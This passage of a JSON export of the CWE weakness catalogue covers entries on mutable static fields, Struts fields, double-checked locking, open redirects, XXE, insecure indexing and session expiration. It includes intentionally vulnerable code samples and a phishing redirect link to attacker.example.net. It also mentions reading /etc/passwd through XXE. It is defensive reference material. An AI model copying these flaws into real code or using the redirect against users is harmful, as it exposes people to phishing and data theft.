              "ExampleCode": "```\n\tint processMessageFromSocket(int socket) {\n\t\t\tint success;\n\t\t\tchar buffer[BUFFER_SIZE];\n\t\t\tchar message[MESSAGE_SIZE];\n```\n// get message from socket and store into buffer* \n\t\t\t\n\t\t\t\n\t\t\t *//Ignoring possibliity that buffer > BUFFER_SIZE* \n\t\t\tif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {\n\t\t\t```\n```\n// place contents of the buffer into message structure* \n\t\t\t\t\tExMessage *msg = recastBuffer(buffer);\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// copy message body into string for processing* \n\t\t\t\t\tint index;\n\t\t\t\t\tfor (index = 0; index < msg->msgLength; index++) {\n\t\t\t\t\t```\n\t\t\t\t\t\tmessage[index] = msg->msgBody[index];\n\t\t\t\t\t}\n\t\t\t\t\tmessage[index] = '\\0';\n```\n// process message* \n\t\t\t\t\tsuccess = processMessage(message);}\n\t\t\treturn success;}"
            },
            {
              "BodyText": "However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130)."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-606"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Looping Constructs\", Page 327",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-606",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "607",
      "Name": "Public Static Final Field References Mutable Object",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "471",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Protect mutable objects by making them private. Restrict access to the getter and setter as well."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Here, an array (which is inherently mutable) is labeled public static final."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic static final String[] USER_ROLES;\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "608",
      "Name": "Struts: Non-private Field in ActionForm Class",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Application Data",
            "Read Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Make all fields private. Use getter to get the value of the field. Setter should be used only by the framework; setting an action form field from other actions is bad practice and should be avoided."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for a online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n\t\t\t// variables for registration form\n\t\t\tpublic String name;\n\t\t\tpublic String email;\n\t\t\t...\n\t\t\tpublic RegistrationForm() {\n\t\t\t\tsuper();\n\t\t\t}\n\t\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n\t\t\t...\n\t}\n```"
            },
            {
              "BodyText": "However, within the RegistrationForm the member variables for the registration form input data are declared public not private. All member variables within a Struts framework ActionForm class must be declared private to prevent the member variables from being modified without using the getter and setter methods. The following example shows the member variables being declared private and getter and setter methods declared for accessing the member variables."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n\t\t\t// private variables for registration form\n\t\t\tprivate String name;\n\t\t\tprivate String email;\n\t\t\t...\n\t\t\tpublic RegistrationForm() {\n\t\t\t\tsuper();\n\t\t\t}\n\t\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n\t\t// getter and setter methods for private variables\n\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "609",
      "Name": "Double-Checked Locking",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.",
      "ExtendedDescription": "Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as it is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "667",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "367",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Alter Execution Logic"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "While double-checked locking can be achieved in some languages, it is inherently flawed in Java before 1.5, and cannot be achieved without compromising platform independence. Before Java 1.5, only use of the synchronized keyword is known to work. Beginning in Java 1.5, use of the \"volatile\" keyword allows double-checked locking to work successfully, although there is some debate as to whether it achieves sufficient performance gains. See references."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-70",
          "Entries": [
            {
              "IntroText": "It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization..."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tif (helper == null) {\n\t\t\tsynchronized (this) {\n\t\t\t\tif (helper == null) {\n\t\t\t\t\thelper = new Helper();\n\t\t\t\t}\n\t\t\t}\n\t}\n\treturn helper;\n```"
            },
            {
              "BodyText": "The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called."
            },
            {
              "BodyText": "Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute:"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\thelper = new Helper();\n```"
            },
            {
              "BodyText": "If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "LCK10-J",
          "EntryName": "Do not use incorrect forms of the double-checked locking idiom"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP19",
          "EntryName": "Missing Lock"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-490",
          "Authors": [
            "David Bacon et al"
          ],
          "Title": "The \"Double-Checked Locking is Broken\" Declaration",
          "URL": "http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html"
        },
        {
          "ExternalReferenceID": "REF-491",
          "Authors": [
            "Jeremy Manson and Brian Goetz"
          ],
          "Title": "JSR 133 (Java Memory Model) FAQ",
          "URL": "http://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#dcl"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 13, \"Threading Vulnerabilities\", Page 815",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "610",
      "Name": "Externally Controlled Reference to a Resource in Another Sphere",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-194",
          "Entries": [
            {
              "IntroText": "The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class RedirectServlet extends HttpServlet {\n\t\t\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t\tString query = request.getQueryString();\n\t\t\t\tif (query.contains(\"url\")) {\n\t\t\t\t\tString url = request.getParameter(\"url\");\n\t\t\t\t\tresponse.sendRedirect(url);\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:"
            },
            {
              "Nature": "Attack",
              "Language": "HTML",
              "ExampleCode": "```\n\t<a href=\"http://bank.example.com/redirect?url=http://attacker.example.net\">Click here to log in</a>\n```"
            },
            {
              "BodyText": "The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-3032",
          "Description": "An email client does not block loading of remote objects in a nested document.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3032"
        },
        {
          "Reference": "CVE-2022-45918",
          "Description": "Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using \"../\" sequences (CWE-24)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-45918"
        },
        {
          "Reference": "CVE-2018-1000613",
          "Description": "Cryptography API uses unsafe reflection when deserializing a private key",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"
        },
        {
          "Reference": "CVE-2020-11053",
          "Description": "Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-11053"
        },
        {
          "Reference": "CVE-2022-42745",
          "Description": "Recruiter software allows reading arbitrary files using XXE",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-42745"
        },
        {
          "Reference": "CVE-2004-2331",
          "Description": "Database system allows attackers to bypass sandbox restrictions by using the Reflection API.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2331"
        }
      ],
      "RelatedAttackPatterns": [
        "219"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will \"follow\" a symbolic link and use the link's target instead."
        },
        {
          "Type": "Maintenance",
          "Note": "The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 \"Resource Injection,\" as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the \"identifier used to access a system resource\" such as a file name or port number, yet it explicitly states that the \"resource injection\" term does not apply to \"path manipulation,\" which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer."
        }
      ]
    },
    {
      "ID": "611",
      "Name": "Improper Restriction of XML External Entity Reference",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.",
      "ExtendedDescription": "\n\nXML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.\n\n\nBy submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as \"file:///c:/winnt/win.ini\" designates (in Windows) the file C:\\Winnt\\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.\n\n\nOnce the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "441",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "XML",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "XXE",
          "Description": "An acronym used for the term \"XML eXternal Entities\""
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)"
          ],
          "Note": "The product could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "System Configuration"
          ],
          "Description": "Many XML parsers and validators can be configured to disable external entity expansion."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-42745",
          "Description": "Recruiter software allows reading arbitrary files using XXE",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-42745"
        },
        {
          "Reference": "CVE-2005-1306",
          "Description": "A browser control can allow remote attackers to determine the existence of files via Javascript containing XML script.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1306"
        },
        {
          "Reference": "CVE-2012-5656",
          "Description": "XXE during SVG image conversion",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-5656"
        },
        {
          "Reference": "CVE-2012-2239",
          "Description": "XXE in PHP application allows reading the application's configuration file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2239"
        },
        {
          "Reference": "CVE-2012-3489",
          "Description": "XXE in database server",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3489"
        },
        {
          "Reference": "CVE-2012-4399",
          "Description": "XXE in rapid web application development framework allows reading arbitrary files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-4399"
        },
        {
          "Reference": "CVE-2012-3363",
          "Description": "XXE via XML-RPC request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3363"
        },
        {
          "Reference": "CVE-2012-0037",
          "Description": "XXE in office document product using RDF.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0037"
        },
        {
          "Reference": "CVE-2011-4107",
          "Description": "XXE in web-based administration tool for database.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-4107"
        },
        {
          "Reference": "CVE-2010-3322",
          "Description": "XXE in product that performs large-scale data analysis.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3322"
        },
        {
          "Reference": "CVE-2009-1699",
          "Description": "XXE in XSL stylesheet functionality in a common library used by some web browsers.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1699"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "43",
          "EntryName": "XML External Entities"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "RelatedAttackPatterns": [
        "221"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-496",
          "Authors": [
            "OWASP"
          ],
          "Title": "XML External Entity (XXE) Processing",
          "URL": "https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing"
        },
        {
          "ExternalReferenceID": "REF-497",
          "Authors": [
            "Sascha Herzog"
          ],
          "Title": "XML External Entity Attacks (XXE)",
          "PublicationYear": "2010",
          "PublicationMonth": "10",
          "PublicationDay": "20",
          "URL": "https://owasp.org/www-pdf-archive/XML_Exteral_Entity_Attack.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-498",
          "Authors": [
            "Gregory Steuck"
          ],
          "Title": "XXE (Xml eXternal Entity) Attack",
          "URL": "https://www.beyondsecurity.com/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-499",
          "Authors": [
            "WASC"
          ],
          "Title": "XML External Entities (XXE) Attack",
          "URL": "http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities"
        },
        {
          "ExternalReferenceID": "REF-500",
          "Authors": [
            "Bryan Sullivan"
          ],
          "Title": "XML Denial of Service Attacks and Defenses",
          "PublicationYear": "2009",
          "PublicationMonth": "09",
          "URL": "https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-501",
          "Authors": [
            "Chris Cornutt"
          ],
          "Title": "Preventing XXE in PHP",
          "URL": "https://websec.io/2012/08/27/Preventing-XXE-in-PHP.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the \"Server\" portion of the SSRF acronym does not necessarily apply."
        }
      ]
    },
    {
      "ID": "612",
      "Name": "Improper Authorization of Index Containing Sensitive Information",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product creates a search index of private or sensitive documents, but it does not properly limit index access to actors who are authorized to see the original information.",
      "ExtendedDescription": "Web sites and other document repositories may apply an indexing routine against a group of private documents to facilitate search. If the index's results are available to parties who do not have access to the documents being indexed, then attackers could obtain portions of the documents by conducting targeted searches and reading the results. The risk is especially dangerous if search results include surrounding text that was not part of the search query. This issue can appear in search engines that are not configured (or implemented) to ignore critical files that should remain hidden; even without permissions to download these files directly, the remote user could read them.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1230",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-41918",
          "Description": "A search application's access control rules are not properly applied to indices for data streams, allowing for the viewing of sensitive information.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-41918"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "48",
          "EntryName": "Insecure Indexing"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1050",
          "Authors": [
            "WASC"
          ],
          "Title": "Insecure Indexing",
          "URL": "http://projects.webappsec.org/w/page/13246937/Insecure%20Indexing"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "This weakness is probably under-studied and under-reported."
        }
      ]
    },
    {
      "ID": "613",
      "Name": "Insufficient Session Expiration",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "According to WASC, \"Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "672",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "672",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "287",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Set sessions/credentials expiration date."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t<web-app>\n\t\t\t[...snipped...]\n\t\t\t<session-config>\n\t\t\t\t<session-timeout>-1</session-timeout>\n\t\t\t</session-config>\n\t</web-app>\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "47",
          "EntryName": "Insufficient Session Expiration"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim."
        }
      ]
    },
    {
      "ID": "614",
      "Name": "Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "319",
          "ViewID": "1000",
